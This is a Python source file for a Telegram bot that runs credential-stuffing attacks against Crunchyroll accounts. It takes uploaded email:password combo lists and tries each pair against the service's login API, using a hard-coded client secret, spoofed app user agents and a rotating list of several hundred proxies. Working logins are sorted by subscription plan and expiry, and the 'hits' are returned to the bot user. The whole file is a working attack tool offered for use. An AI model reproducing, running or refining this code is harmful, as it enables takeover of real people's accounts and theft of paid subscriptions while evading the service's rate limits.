import asyncio
import aiohttp
import uuid
import random
import io
import datetime
import os
import logging
from datetime import datetime as dt
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.error import TelegramError, BadRequest, Forbidden, NetworkError

# --- LOGGING ---
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- CONFIG ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable is not set. Please add it to your secrets.")

THREADS = 10
CLIENT_ID = "ajcylfwdtjjtq7qpgks3"
CLIENT_SECRET = "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_"

USER_AGENTS = [
    "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
    "Crunchyroll/3.68.0 Android/9 okhttp/4.12.0",
    "Crunchyroll/3.48.2 Android/9 okhttp/4.12.0"
]

# --- ACTIVE CHECKERS (for cancel support) ---
active_checkers: dict[int, "CrunchyChecker"] = {}

# --- BUILT-IN PROXIES ---
BUILTIN_PROXIES = """13.36.243.194:9899
165.225.113.220:11462
165.225.113.220:11233
15.188.75.223:3128
165.225.113.220:10679
165.225.113.220:10958
132.226.163.224:2053
201.238.248.134:443
13.230.49.39:8080
134.209.188.167:443
139.59.5.27:443
51.178.138.128:80
185.142.66.201:8080
3.99.169.21:8888
40.177.151.5:42099
78.12.220.164:8831
3.110.127.255:6571
15.168.235.57:37140
78.12.223.246:6139
52.66.191.112:7274
3.110.127.255:13115
40.192.18.48:34352
52.199.97.69:49250
16.79.112.218:8031
34.236.148.220:49419
35.180.127.14:1001
13.233.195.7:29541
3.145.87.184:53904
18.100.254.193:26507
15.168.235.57:13270
52.199.97.69:18610
18.201.114.187:9090
18.100.254.193:37762
3.99.169.21:14887
52.67.14.48:54558
3.99.169.21:46334
98.130.124.119:58448
15.168.235.57:8600
18.100.254.193:43940
52.66.191.112:44036
43.198.99.209:9088
43.208.16.199:766
40.177.212.16:32255
18.100.126.55:57555
43.198.99.209:21820
52.78.193.98:8246
40.177.211.224:8758
95.40.79.184:8123
52.67.14.48:48203
18.100.127.123:9323
43.208.16.199:30756
18.201.114.187:10879
52.78.193.98:4161
43.198.99.209:166
95.40.79.184:50049
51.158.152.135:443
163.172.221.209:443
185.33.239.224:8080
51.68.191.231:443
89.109.7.67:443
51.77.200.90:80
161.97.162.118:80
88.198.212.91:3128
89.43.31.134:3128
74.82.50.155:3128
177.68.149.122:8080
202.131.159.222:80
146.190.232.76:3128
45.227.195.121:8082
116.80.49.163:3172
116.80.48.217:7777
190.60.57.42:3128
188.239.43.6:80
216.250.11.178:3128
175.138.75.137:8080
180.191.124.149:8081
51.141.175.118:80
177.190.218.145:9999
192.232.48.28:8181
45.88.0.117:3128
173.245.49.10:80
173.245.49.121:80
173.245.49.161:80
222.98.121.226:80
220.88.5.106:80
116.80.64.158:7777
203.24.109.80:80
159.112.235.64:80
219.117.204.211:7799
173.245.49.105:80
185.176.24.253:80
194.87.43.46:8080
103.48.71.2:83
173.245.49.50:80
103.175.237.36:8080
103.213.97.78:80
173.245.49.222:80
173.245.49.160:80
159.65.230.46:8888
8.209.255.13:3128
173.245.49.112:80
173.245.49.225:80
173.245.49.231:80
173.245.49.119:80
38.180.2.107:3128
185.162.94.28:8080
173.245.49.86:80
173.245.49.64:80
172.200.72.48:80
203.23.104.106:80
173.245.49.85:80
173.245.49.102:80
173.245.49.42:80
173.245.49.43:80
162.240.154.26:3128
173.245.49.91:80
173.245.49.137:80
186.96.111.214:999
48.210.225.96:80
185.18.250.181:80
209.14.113.2:999
185.18.250.232:80
173.245.49.16:80
172.67.70.35:80
186.33.40.17:999
173.245.49.66:80
8.219.191.219:8118
40.89.145.14:80
193.43.159.200:80
173.245.49.163:80
173.245.49.199:80
160.123.255.71:80
173.245.49.101:80
116.80.49.162:3172
173.245.49.116:80
1.231.81.166:3128
203.30.190.57:80
196.204.138.244:1976
104.16.0.104:80
133.242.138.34:8100
103.48.68.141:83
4.213.167.178:80
45.88.0.111:3128
173.245.49.219:80
201.62.125.142:8080
173.245.49.232:80
142.93.202.130:3128
47.89.184.18:3128
173.245.49.122:80
173.245.49.26:80
74.176.195.135:80
139.59.103.183:80
47.91.65.23:3128
45.88.0.115:3128
173.245.49.242:80
185.18.250.83:80
203.13.32.218:80
213.131.85.28:1981
82.210.56.251:80
4.213.98.253:80
173.245.49.229:80
173.245.49.169:80
173.245.49.69:80
203.32.121.171:80
173.245.49.173:80
191.102.123.196:999
104.16.0.201:80
173.245.49.48:80
52.229.30.3:80
173.245.49.150:80
173.245.49.185:80
115.231.181.40:8128
116.80.65.80:3172
185.191.236.162:3128
211.192.82.15:443
18.133.120.146:3128
23.236.144.90:3128
45.230.169.129:999
49.156.44.114:8080
8.140.104.98:3128
103.42.203.161:8090
91.238.105.64:2024
222.228.171.92:8080
206.81.27.105:3128
157.10.97.101:8181
103.231.236.235:8182
203.142.74.115:8080
43.135.159.230:9562
43.130.35.101:19504
172.67.121.67:80
103.38.104.164:7777
103.189.250.89:8090
136.228.234.29:8009
136.228.234.4:8009
185.235.16.12:80
27.74.247.173:8080
156.230.213.219:8800
8.222.175.80:6128
177.234.217.236:999
104.248.25.131:3128
168.222.254.136:8888
201.77.110.33:999
173.212.222.244:8888
111.93.235.75:80
162.159.242.104:80
1.0.0.225:80
172.67.182.96:80
172.67.180.6:80
172.67.181.120:80
162.159.247.57:80
172.67.182.41:80
203.23.106.192:80
162.159.242.33:80
172.67.182.49:80
173.245.49.9:80
104.20.58.184:80
172.67.181.143:80
162.159.242.190:80
104.16.65.85:80
1.0.0.185:80
172.67.181.146:80
162.159.242.184:80
104.17.125.40:80
172.67.181.91:80
1.1.1.154:80
172.67.182.88:80
172.67.182.102:80
141.101.123.214:80
1.0.0.227:80
172.67.254.143:80
172.67.179.58:80
104.16.28.216:80
104.16.11.128:80
162.159.242.53:80
1.0.0.138:80
1.1.1.155:80
1.1.1.39:80
1.1.1.48:80
162.159.242.254:80
172.67.182.63:80
172.67.255.220:80
1.1.1.5:80
172.67.208.217:80
1.0.0.1:80
172.67.254.152:80
1.1.1.131:80
1.1.1.197:80
162.159.242.136:80
136.243.81.120:8080
104.17.62.167:80
1.0.0.24:80
104.20.19.239:80
162.159.242.70:80
162.159.242.224:80
162.159.248.115:80
162.159.242.197:80
1.0.0.249:80
1.1.1.38:80
1.1.1.141:80
1.1.1.63:80
1.0.0.114:80
172.67.222.111:80
104.16.8.119:80
104.16.11.129:80
1.1.1.164:80
172.67.181.30:80
1.0.0.181:80
1.1.1.239:80
172.67.253.69:80
172.67.182.31:80
172.67.181.135:80
104.25.228.156:80
172.67.181.21:80
1.0.0.189:80
141.101.123.221:80
1.0.0.170:80
104.25.7.36:80
104.26.5.185:80
1.0.0.234:80
104.17.187.219:80
1.1.1.242:80
1.1.1.21:80
162.159.250.145:80
172.67.181.52:80
162.159.246.113:80
162.159.242.112:80
1.1.1.211:80
1.1.1.80:80
162.159.242.225:80
104.26.2.46:80
162.159.242.19:80
172.67.255.211:80
104.18.221.12:80
162.159.247.4:80
172.67.181.11:80
1.1.1.66:80
172.67.182.28:80
1.1.1.219:80
162.159.242.130:80
1.0.0.239:80
141.101.122.234:80
162.159.242.129:80
172.67.71.85:80
162.159.242.154:80
1.1.1.15:80
172.67.182.53:80
104.18.197.95:80
104.24.134.74:80
1.0.0.64:80
1.1.1.227:80
162.159.244.149:80
162.159.242.211:80
1.0.0.119:80
1.1.1.31:80
172.67.181.42:80
203.32.121.97:80
172.67.187.199:80
1.0.0.161:80
104.17.153.216:80
172.67.254.159:80
162.159.242.146:80
104.25.121.133:80
1.0.0.191:80
1.0.0.250:80
104.21.236.208:80
172.67.254.146:80
1.0.0.11:80
162.159.247.83:80
173.245.49.31:80
172.67.181.174:80
104.27.41.39:80
1.1.1.144:80
1.0.0.236:80
162.159.242.30:80
172.67.255.2:80
1.0.0.233:80
1.1.1.134:80
172.67.181.192:80
172.67.181.37:80
104.17.122.44:80
172.67.181.180:80
172.67.253.7:80
1.1.1.115:80
1.1.1.235:80
173.245.49.8:80
172.67.182.84:80
172.67.181.79:80
104.16.11.137:80
172.67.253.207:80
162.159.242.52:80
162.159.242.182:80
173.245.49.20:80
162.159.242.81:80
172.67.181.185:80
1.0.0.60:80
176.126.207.17:80
162.159.241.15:80
162.159.251.91:80
1.0.0.16:80
1.0.0.242:80
1.0.0.251:80
1.0.0.203:80
162.159.242.248:80
172.67.182.162:80
104.27.13.78:80
172.67.181.201:80
1.1.1.133:80
162.159.242.208:80
172.67.182.150:80
1.0.0.125:80
162.159.244.230:80
104.25.41.173:80
141.101.115.26:80
172.67.182.128:80
172.67.181.194:80
104.17.161.175:80
1.1.1.69:80
162.159.248.49:80
104.18.186.120:80
172.67.181.164:80
172.67.254.165:80
1.1.1.254:80
199.60.103.28:80
173.245.49.29:80
104.16.31.44:80
172.67.181.60:80
162.159.242.74:80
104.19.130.40:80
162.159.242.42:80
162.159.242.63:80
162.159.244.192:80
1.0.0.237:80
1.1.1.234:80
162.159.246.190:80
172.67.181.178:80
162.159.244.191:80
1.0.0.59:80
104.16.125.40:80
104.16.109.143:80
162.159.242.2:80
198.41.214.67:80
162.159.242.165:80
1.1.1.233:80
1.1.1.148:80
172.67.182.99:80
190.93.247.3:80
1.0.0.52:80
141.101.123.226:80
162.159.242.14:80
162.159.242.255:80
1.0.0.33:80
1.0.0.116:80
162.159.242.43:80
172.67.178.110:80
162.159.242.134:80
1.1.1.180:80
1.1.1.171:80
198.41.214.68:80
1.0.0.226:80
1.0.0.110:80
104.20.17.224:80
162.159.242.142:80
104.21.33.52:80
162.159.242.245:80
173.245.49.15:80
1.0.0.205:80
173.245.49.19:80
162.159.242.206:80
172.67.181.222:80
172.67.181.213:80
104.24.158.77:80
162.159.242.192:80
162.159.242.98:80
1.1.1.215:80
1.0.0.244:80
162.159.242.215:80
162.159.243.178:80
1.0.0.41:80"""


def load_builtin_proxies():
    proxies = []
    for line in BUILTIN_PROXIES.strip().splitlines():
        line = line.strip()
        if line:
            proxies.append(line)
    random.shuffle(proxies)
    return proxies


# ──────────────────────────────────────────────
# CHECKER CLASS (logic unchanged)
# ──────────────────────────────────────────────
class CrunchyChecker:
    def __init__(self, combos, proxies=None):
        self.combos = combos
        self.proxies = proxies if proxies else []
        self.proxy_index = 0
        self.proxy_lock = asyncio.Lock()

        self.hits = []
        self.free = []
        self.bad = 0
        self.checked = 0
        self.total = len(combos)
        self.cpm = 0
        self.start_time = 0
        self.cancelled = False

        self.lock = asyncio.Lock()

    async def get_next_proxy(self):
        if not self.proxies:
            return None
        async with self.proxy_lock:
            proxy = self.proxies[self.proxy_index]
            self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
            return f"http://{proxy}"

    def generate_device_id(self):
        return str(uuid.uuid4())

    async def check_account(self, session, email, password):
        proxy_url = await self.get_next_proxy()
        device_id = self.generate_device_id()
        user_agent = random.choice(USER_AGENTS)
        proxy_conn = proxy_url if proxy_url else None

        try:
            url = "https://beta-api.crunchyroll.com/auth/v1/token"
            data = {
                'grant_type': 'password',
                'username': email,
                'password': password,
                'scope': 'offline_access',
                'client_id': CLIENT_ID,
                'client_secret': CLIENT_SECRET,
                'device_type': 'SamsungTV',
                'device_id': device_id,
                'device_name': 'Checker'
            }
            headers = {
                'User-Agent': user_agent,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'beta-api.crunchyroll.com',
            }

            async with session.post(url, data=data, headers=headers, proxy=proxy_conn, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if resp.status != 200:
                    return {'status': 'bad', 'email': email}
                text = await resp.text()
                if 'error' in text or 'access_token' not in text:
                    return {'status': 'bad', 'email': email}
                resp_json = await resp.json()
                token = resp_json.get('access_token')

            headers2 = {
                'User-Agent': user_agent,
                'Authorization': f'Bearer {token}',
                'Host': 'beta-api.crunchyroll.com',
            }
            url2 = "https://beta-api.crunchyroll.com/accounts/v1/me"
            async with session.get(url2, headers=headers2, proxy=proxy_conn, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if resp.status != 200:
                    return {'status': 'bad', 'email': email}
                account_data = await resp.json()

            external_id = account_data.get('external_id', '')
            email_verified = account_data.get('email_verified', False)

            url3 = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits"
            async with session.get(url3, headers=headers2, proxy=proxy_conn, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if resp.status == 404:
                    return {'status': 'free', 'email': email, 'password': password}
                benefits_data = await resp.json()

            total_benefits = benefits_data.get('total', 0)
            if total_benefits == 0:
                return {'status': 'free', 'email': email, 'password': password}

            streams = None
            if 'items' in benefits_data:
                for item in benefits_data['items']:
                    benefit = item.get('benefit', '')
                    if 'concurrent_streams' in benefit:
                        try:
                            if 'concurrent_streams.' in benefit:
                                temp = benefit.split('concurrent_streams.')[1]
                                streams = ''.join(filter(str.isdigit, temp[:2]))
                                break
                        except:
                            pass

            if streams == '1':
                plan_type = 'FAN'
            elif streams == '4':
                plan_type = 'MEGA FAN'
            elif streams == '6':
                plan_type = 'ULTIMATE FAN'
            else:
                plan_type = 'PREMIUM'

            url4 = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}"
            async with session.get(url4, headers=headers2, proxy=proxy_conn, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                renewal_data = await resp.json()

            next_renewal = renewal_data.get('next_renewal_date', '')
            expiry_date = 'Lifetime'
            remaining_days = '∞'

            if next_renewal:
                try:
                    expiry_date = next_renewal.split('T')[0]
                    exp_dt = dt.strptime(expiry_date, '%Y-%m-%d')
                    remaining_days = (exp_dt - dt.now()).days
                    if remaining_days < 0:
                        return {'status': 'expired', 'email': email, 'password': password}
                except:
                    pass

            return {
                'status': 'hit',
                'email': email,
                'password': password,
                'plan': plan_type,
                'expiry': expiry_date,
                'days': remaining_days,
                'verified': email_verified
            }

        except Exception:
            return {'status': 'error', 'email': email}

    async def worker(self, session, context, chat_id, message_id):
        while not self.cancelled:
            try:
                combo = self.combos.pop(0)
            except IndexError:
                break

            parts = combo.split(':', 1)
            if len(parts) != 2:
                async with self.lock:
                    self.bad += 1
                    self.checked += 1
                continue

            email, password = parts[0].strip(), parts[1].strip()
            result = await self.check_account(session, email, password)

            async with self.lock:
                self.checked += 1
                if result['status'] == 'hit':
                    self.hits.append(result)
                    try:
                        hit_text = (
                            f"✅ *HIT FOUND*\n\n"
                            f"📧 `{email}:{password}`\n"
                            f"💎 Plan: {result['plan']}\n"
                            f"📅 Expiry: {result['expiry']}\n"
                            f"⏳ Days: {result['days']}"
                        )
                        await context.bot.send_message(chat_id=chat_id, text=hit_text, parse_mode='Markdown')
                    except TelegramError:
                        pass
                elif result['status'] == 'free':
                    self.free.append(result)
                else:
                    self.bad += 1

    async def run(self, context: ContextTypes.DEFAULT_TYPE, chat_id, message_id):
        self.start_time = datetime.datetime.now().timestamp()
        connector = aiohttp.TCPConnector(limit=0)

        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(THREADS):
                task = asyncio.create_task(self.worker(session, context, chat_id, message_id))
                tasks.append(task)

            while not all(t.done() for t in tasks):
                await asyncio.sleep(4)
                if self.cancelled:
                    break
                elapsed = datetime.datetime.now().timestamp() - self.start_time
                if elapsed > 0:
                    self.cpm = int((self.checked / elapsed) * 60)

                progress_bar = self._progress_bar()
                cancel_kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛑 Cancel Check", callback_data="cancel_check")]
                ])
                text = (
                    f"⚡ *CRUNCHYROLL CHECKER*\n\n"
                    f"{progress_bar}\n"
                    f"📊 *Progress:* `{self.checked}/{self.total}`\n"
                    f"⚡ *CPM:* `{self.cpm}`\n\n"
                    f"✅ *Hits:* `{len(self.hits)}`\n"
                    f"🆓 *Free:* `{len(self.free)}`\n"
                    f"❌ *Bad:* `{self.bad}`"
                )
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id, message_id=message_id,
                        text=text, parse_mode='Markdown',
                        reply_markup=cancel_kb
                    )
                except (BadRequest, TelegramError):
                    pass

            await asyncio.gather(*tasks)

        # Remove from active checkers
        active_checkers.pop(chat_id, None)

        elapsed = datetime.datetime.now().timestamp() - self.start_time
        final_cpm = int((self.checked / elapsed) * 60) if elapsed > 0 else 0

        if self.cancelled:
            text = (
                f"🛑 *CHECK CANCELLED*\n\n"
                f"📊 Checked: `{self.checked}/{self.total}`\n"
                f"✅ Hits: `{len(self.hits)}`\n"
                f"🆓 Free: `{len(self.free)}`\n"
                f"❌ Bad: `{self.bad}`"
            )
        else:
            text = (
                f"🏁 *CHECK COMPLETE*\n\n"
                f"✅ *Hits:* `{len(self.hits)}`\n"
                f"🆓 *Free:* `{len(self.free)}`\n"
                f"❌ *Bad:* `{self.bad}`\n"
                f"⚡ *Avg CPM:* `{final_cpm}`"
            )

        again_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Check Again", callback_data="check_again"),
             InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
        ])

        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=message_id,
                text=text, parse_mode='Markdown',
                reply_markup=again_kb
            )
        except TelegramError:
            pass

        if self.hits:
            output = ""
            for h in self.hits:
                output += f"Email: {h['email']}\nPass: {h['password']}\nPlan: {h['plan']} | Expiry: {h['expiry']}\n{'=' * 40}\n"
            bio = io.BytesIO(output.encode('utf-8'))
            bio.name = "hits.txt"
            try:
                await context.bot.send_document(
                    chat_id=chat_id, document=bio,
                    caption=f"✅ *{len(self.hits)} hits found!*",
                    parse_mode='Markdown'
                )
            except TelegramError:
                pass

    def _progress_bar(self):
        if self.total == 0:
            return "▱▱▱▱▱▱▱▱▱▱ 0%"
        pct = int((self.checked / self.total) * 10)
        bar = "▰" * pct + "▱" * (10 - pct)
        return f"{bar} {int((self.checked / self.total) * 100)}%"


# ──────────────────────────────────────────────
# UI HELPERS
# ──────────────────────────────────────────────
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Check Accounts", callback_data="check_accounts")],
        [InlineKeyboardButton("ℹ️ How to Use", callback_data="how_to_use"),
         InlineKeyboardButton("📊 Bot Info", callback_data="bot_info")],
        [InlineKeyboardButton("👨‍💻 Developer", url="https://t.me/SynaxBotz")]
    ])

WELCOME_TEXT = (
    "🎌 *CRUNCHYROLL CHECKER BOT*\n"
    "━━━━━━━━━━━━━━━━━━━━━\n\n"
    "Welcome! This bot checks Crunchyroll accounts\n"
    "from your combo list automatically.\n\n"
    "🔌 *Proxies:* Auto-loaded ✅\n"
    "⚡ *Threads:* 10 concurrent\n"
    "🎯 *Detects:* Fan, Mega Fan, Ultimate Fan, Premium\n\n"
    "Press *Check Accounts* to get started!"
)


# ──────────────────────────────────────────────
# COMMAND HANDLERS
# ──────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        WELCOME_TEXT,
        parse_mode='Markdown',
        reply_markup=main_menu_keyboard()
    )


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    checker = active_checkers.get(chat_id)
    if checker:
        checker.cancelled = True
        await update.message.reply_text("🛑 Cancelling the current check...")
    else:
        await update.message.reply_text(
            "⚠️ No active check to cancel.",
            reply_markup=main_menu_keyboard()
        )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "📖 *HOW TO USE*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "1️⃣ Press *Check Accounts* from the menu\n"
        "2️⃣ Send your `.txt` combo file\n"
        "   Format: `email:password` (one per line)\n"
        "3️⃣ Bot checks automatically with proxies\n"
        "4️⃣ Hits are sent instantly as found\n"
        "5️⃣ Results file sent when done\n\n"
        "*Commands:*\n"
        "/start — Main menu\n"
        "/cancel — Stop active check\n"
        "/help — Show this message"
    )
    await update.message.reply_text(
        text, parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
        ])
    )


# ──────────────────────────────────────────────
# BUTTON CALLBACK HANDLER
# ──────────────────────────────────────────────
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id
    data = query.data

    if data == "main_menu":
        try:
            await query.edit_message_text(
                WELCOME_TEXT,
                parse_mode='Markdown',
                reply_markup=main_menu_keyboard()
            )
        except BadRequest:
            pass

    elif data == "check_accounts":
        checker = active_checkers.get(chat_id)
        if checker and not checker.cancelled:
            await query.edit_message_text(
                "⚠️ *A check is already running!*\n\n"
                "Please wait for it to finish or use /cancel to stop it.",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛑 Cancel Check", callback_data="cancel_check")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
                ])
            )
            return
        context.user_data['waiting_for_combo'] = True
        await query.edit_message_text(
            "📂 *Send your combo file*\n\n"
            "Upload a `.txt` file with one `email:password` per line.\n\n"
            "_Example:_\n`user@email.com:password123`",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
            ])
        )

    elif data == "cancel_check":
        checker = active_checkers.get(chat_id)
        if checker:
            checker.cancelled = True
            await query.answer("🛑 Cancelling...", show_alert=False)
        else:
            await query.answer("No active check found.", show_alert=True)

    elif data == "check_again":
        context.user_data['waiting_for_combo'] = True
        try:
            await query.edit_message_text(
                "📂 *Send your combo file*\n\n"
                "Upload a `.txt` file with one `email:password` per line.",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
                ])
            )
        except BadRequest:
            pass

    elif data == "how_to_use":
        text = (
            "📖 *HOW TO USE*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "1️⃣ Press *Check Accounts* from the menu\n"
            "2️⃣ Send your `.txt` combo file\n"
            "   Format: `email:password` (one per line)\n"
            "3️⃣ Bot checks automatically with proxies\n"
            "4️⃣ Hits are sent instantly as found\n"
            "5️⃣ Results file sent when done\n\n"
            "*Commands:*\n"
            "/start — Main menu\n"
            "/cancel — Stop active check\n"
            "/help — Show this message"
        )
        await query.edit_message_text(
            text, parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
            ])
        )

    elif data == "bot_info":
        proxies = load_builtin_proxies()
        text = (
            "📊 *BOT INFO*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔌 *Built-in Proxies:* `{len(proxies)}`\n"
            f"⚡ *Threads:* `{THREADS}`\n"
            f"🎯 *Target:* Crunchyroll\n"
            f"🤖 *Bot:* @SynaxBotz Checker\n\n"
            "🟢 Bot is online and ready!"
        )
        await query.edit_message_text(
            text, parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
            ])
        )


# ──────────────────────────────────────────────
# DOCUMENT HANDLER
# ──────────────────────────────────────────────
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    if not context.user_data.get('waiting_for_combo'):
        await update.message.reply_text(
            "⚠️ Please press *Check Accounts* from the menu first.",
            parse_mode='Markdown',
            reply_markup=main_menu_keyboard()
        )
        return

    doc = update.message.document
    if not doc:
        return

    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text(
            "❌ *Wrong file type!*\n\nPlease send a `.txt` file.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Try Again", callback_data="check_accounts")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
            ])
        )
        return

    context.user_data['waiting_for_combo'] = False

    status_msg = await update.message.reply_text("📥 *Downloading file...*", parse_mode='Markdown')

    try:
        file = await doc.get_file()
        file_path = f"combo_{chat_id}.txt"
        await file.download_to_drive(file_path)
    except TelegramError as e:
        logger.error(f"File download failed: {e}")
        await status_msg.edit_text(
            "❌ *Failed to download file.*\n\nPlease try again.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Try Again", callback_data="check_accounts")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
            ])
        )
        return

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line.strip()]
    except Exception as e:
        logger.error(f"Error reading combo file: {e}")
        await status_msg.edit_text(
            "❌ *Could not read the file.*\n\nMake sure it's a valid text file.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Try Again", callback_data="check_accounts")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
            ])
        )
        return

    if not combos:
        await status_msg.edit_text(
            "❌ *No valid combos found!*\n\n"
            "Make sure your file uses `email:password` format, one per line.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Try Again", callback_data="check_accounts")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
            ])
        )
        return

    proxies = load_builtin_proxies()

    await status_msg.edit_text(
        f"⚡ *CRUNCHYROLL CHECKER*\n\n"
        f"▱▱▱▱▱▱▱▱▱▱ 0%\n"
        f"📊 *Progress:* `0/{len(combos)}`\n"
        f"⚡ *CPM:* `0`\n\n"
        f"✅ *Hits:* `0`\n"
        f"🆓 *Free:* `0`\n"
        f"❌ *Bad:* `0`",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🛑 Cancel Check", callback_data="cancel_check")]
        ])
    )

    checker = CrunchyChecker(combos, proxies)
    active_checkers[chat_id] = checker
    asyncio.create_task(checker.run(context, chat_id, status_msg.message_id))


# ──────────────────────────────────────────────
# UNKNOWN MESSAGE HANDLER
# ──────────────────────────────────────────────
async def handle_unknown_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('waiting_for_combo'):
        await update.message.reply_text(
            "📂 *Please send a `.txt` file*, not a text message.\n\n"
            "Your combo file should be a `.txt` attachment.",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "👋 Use the menu below to get started!",
            reply_markup=main_menu_keyboard()
        )


# ──────────────────────────────────────────────
# ERROR HANDLER
# ──────────────────────────────────────────────
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    error = context.error
    logger.error(f"Unhandled error: {error}", exc_info=True)

    if isinstance(error, Forbidden):
        logger.warning("Bot was blocked by a user.")
        return

    if isinstance(error, NetworkError):
        logger.warning(f"Network error (will retry): {error}")
        return

    if isinstance(error, BadRequest):
        logger.warning(f"Bad request (likely a stale message edit): {error}")
        return

    if update and hasattr(update, 'effective_chat') and update.effective_chat:
        try:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="⚠️ *An unexpected error occurred.*\n\nPlease try again or use /start to reset.",
                parse_mode='Markdown',
                reply_markup=main_menu_keyboard()
            )
        except TelegramError:
            pass


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────
def main():
    logger.info("🚀 Crunchyroll Checker Bot is starting...")
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .build()
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_unknown_message))
    application.add_error_handler(error_handler)

    logger.info("✅ Bot is running! Send /start in Telegram.")
    application.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
